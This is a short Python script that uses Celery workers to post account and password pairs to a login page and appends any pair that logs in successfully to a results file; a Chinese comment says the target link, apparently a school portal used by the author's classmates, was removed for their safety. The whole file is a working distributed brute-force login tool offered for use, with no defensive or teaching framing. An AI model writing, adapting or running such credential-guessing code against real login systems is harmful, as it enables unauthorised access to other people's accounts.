from __future__ import absolute_import
from celery import Celery
import requests
from bs4 import BeautifulSoup
import re

url='http://xxx/Login'                  #为了同学信息安全，上传版本的链接已移除
 
multi = Celery('task1',  backend='redis://localhost:6379/0', broker='redis://localhost:6379/0')

@multi.task
def TryLogin(account,password):
    params={'IDToken1':'','IDToken2':''}
    params['IDToken1']=account
    params['IDToken2'] =password
    r=requests.post(url,data=params)
    bsObj=BeautifulSoup(r.text,"html.parser")
    FeedBack=bsObj.find("title")
    if re.search('Please',FeedBack.get_text()):
        print('Success with:',params['IDToken1'],'and',params['IDToken2'])
        f=open('result.txt','a')
        f.write(params['IDToken1']+' '+params['IDToken2']+'\n')
        f.close()
    #else:
        #print('failed')
#print(FeedBack.get_text())
